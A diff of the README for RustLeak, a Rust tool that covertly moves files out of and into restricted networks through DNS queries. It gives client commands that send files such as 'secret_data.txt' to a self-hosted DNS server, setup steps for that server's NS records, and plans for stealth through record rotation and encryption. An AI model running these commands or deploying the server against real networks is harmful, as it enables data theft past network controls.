@@ -1,6 +1,6 @@
 # **RustLeak**
 
-**RustLeak** is a lightweight and stealthy DNS-based data exfiltration and infiltration toolkit, built with Rust. It can be used in a restricted environment. It consists of two main components:
+**RustLeak** is a DNS-based data exfiltration and infiltration toolkit, built with Rust. It can be used in a restricted environment. It aims in the future to be more stealth. It consists of two main components:
 
 - **`rustleak-server`**: The custom DNS server that processes data through DNS queries.
 - **`rustleak-client`**: The client tool to send or receive data using the server.
@@ -10,10 +10,13 @@
 ## **Important Notice**
 - You need to set up and host the DNS Server.
 - Update your DNS provider settings to redirect DNS traffic to your server.
+  
+## **Speeds**
 
-**Note**: Actual speed is limited:
-- **Upload**: ~250 Bytes/s
-- **Download**: ~230 Bytes/s
+| Version | Upload         | Download       |
+|---------|----------------|----------------|
+| v0.1.0  | ~250 Bytes/s   | ~230 Bytes/s   |
+| v0.1.1  | ~23 000 Bytes/s (4 threads ) | ~23 000 Bytes/s (4 threads ) |
 
 ---
 
@@ -31,11 +34,12 @@
 ---
 
 ## **Possible Upgrades**
-- **Single Encryption**: Encrypt data for stealth (Restricted Host <--> DNS Server).
-- **Dual Encryption**: Encrypt data for full stealth (Restricted Host <--> DNS Server <--> External Host).
-- **Record Type Rotation**: Support additional DNS record types beyond TXT records.
-- **Upload Speed Upgrade**: Transfer more labels in upload queries.
-- **Download Speed Upgrade**: Transfer more data per download query.
+- [x] **Record Type Rotation**: Upload request types vary between TXT, A, AAAA, and CNAME.
+- [x] **Multi-threading**: Allow the use of multi-threading to increase speed (at the cost of stealth).
+- [ ] **Symmetric Encryption**: Encrypt data by providing a code for encryption when starting the program.
+- [ ] **Asymmetric Encryption**: Encrypt data automatically without requiring a code for encryption.
+- [ ] **Upload Speed Upgrade**: Transfer more labels in upload queries.
+- [ ] **Download Speed Upgrade**: Transfer more data per download query.
 
 ---
 
@@ -46,15 +50,15 @@
 - Cargo (Rust package manager)
 
 ### Clone the Repository
-\`\`\`bash
+```bash
 git clone https://github.com/Natounet/RustLeak.git
 cd RustLeak
-\`\`\`
+```
 
 ### Build the Tools
-\`\`\`bash
+```bash
 cargo build --release
-\`\`\`
+```
 
 ---
 
@@ -62,42 +66,43 @@ cargo build --release
 
 ### **Client: \`rustleak-client\`**
 The client provides commands to send or receive data via DNS queries. Below are the supported commands:
+- `[-t nb]`: Optionally specify the number of threads to use.
 
 #### **Send Data**
 Use the \`Send\` command to exfiltrate data:
-\`\`\`bash
-rustleak-client send --code <unique_code> --filename <file_to_send> --domain <dns_server_domain>
-\`\`\`
+```bash
+rustleak-client [-t nb] send --code <unique_code> --filename <file_to_send> --domain <dns_server_domain>
+```
 
 **Options**:
-- \`--code\`: A unique identifier for the data being sent.
-- \`--filename\`: Path to the file containing the data to be sent.
-- \`--domain\`: The domain name managed by the DNS server.
+- `--code`: A unique identifier for the data being sent.
+- `--filename`: Path to the file containing the data to be sent.
+- `--domain`: The domain name managed by the DNS server.
 
 **Example**:
-\`\`\`bash
+```bash
 rustleak-client send --code test123 --filename secret_data.txt --domain example.com
-\`\`\`
+```
 
 ![upload](https://github.com/user-attachments/assets/cb1cfe8d-8ff6-4c0f-a24a-2f25a153ece6)
 
 
 
 #### **Receive Data**
-Use the \`Receive\` command to retrieve data:
-\`\`\`bash
-rustleak-client receive --code <unique_code> --filename <output_file> --domain <dns_server_domain>
-\`\`\`
+Use the `Receive` command to retrieve data:
+```bash
+rustleak-client [-t nb] receive --code <unique_code> --filename <output_file> --domain <dns_server_domain>
+```
 
 **Options**:
-- \`--code\`: The unique identifier for the data to retrieve.
-- \`--filename\`: Path to the file where the received data will be saved.
-- \`--domain\`: The domain name managed by the DNS server.
+- `--code`: The unique identifier for the data to retrieve.
+- `--filename`: Path to the file where the received data will be saved.
+- `--domain`: The domain name managed by the DNS server.
 
 **Example**:
-\`\`\`bash
+```bash
 rustleak-client receive --code test123 --filename received_data.txt --domain example.com
-\`\`\`
+```
 
 ![download](https://github.com/user-attachments/assets/bd13898f-bcdc-4ddf-8241-50bf65275ed4)
 
@@ -109,34 +114,33 @@ The server handles DNS queries for a specific domain.
 
 #### **Start the Server**
 Run the server and specify the DNS zone to manage:
-\`\`\`bash
+```bash
 rustleak-server --domain <dns_zone> 
-\`\`\`
+```
 
 **Options**:
-- \`--domain\`: The DNS zone to manage (e.g., \`example.com\`).
-- \`--port\`: The port for the DNS server (default: 53).
-- \`--output\`: File to save data received from clients.
+- `--domain`: The DNS zone to manage (e.g., \`example.com\`).
+- `--port`: The port for the DNS server (default: 53).
+- `--output`: File to save data received from clients.
 
 **Example**:
-\`\`\`bash
+```bash
 rustleak-server --domain example.com 
-\`\`\`
+```
 
 ---
 
 ## **Deployment**
 
-To deploy \`rustleak-server\` online:
+To deploy `rustleak-server` online:
 1. Obtain a domain name (e.g., \`example.com\`) and configure its DNS records.
 2. Point your domain's **NS record** to the public IP of the machine running \`rustleak-server\`.
 3. Start the server with the appropriate domain.
 
 **DNS Configuration Example**:
-\`\`\`plaintext
+```plaintext
 example.com.    IN NS   <server-public-ip>
-\`\`\`
-
+```
 ---
 
 ## **License**
